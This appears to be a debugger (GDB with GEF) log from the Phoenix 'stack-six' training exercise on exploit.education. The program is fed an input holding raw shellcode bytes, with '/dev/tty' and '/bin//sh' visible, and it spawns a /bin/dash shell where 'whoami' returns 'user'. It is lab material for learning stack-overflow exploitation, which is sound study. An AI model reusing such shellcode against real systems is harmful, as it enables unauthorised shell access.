GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/amd64/stack-six...(no debugging symbols found)...done.
gef➤  r
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you ��������������������������������������������������H1�P_�PH�/dev/ttyWT_P^f�'�PH�/bin//shWT_PWT^H��;������������������������
process 356 is executing new program: /bin/dash
warning: Could not load shared library symbols for linux-vdso.so.1.
Do you need "set solib-search-path" or "set sysroot"?
$ whoami
[Detaching after fork from child process 360]
user
$ 
```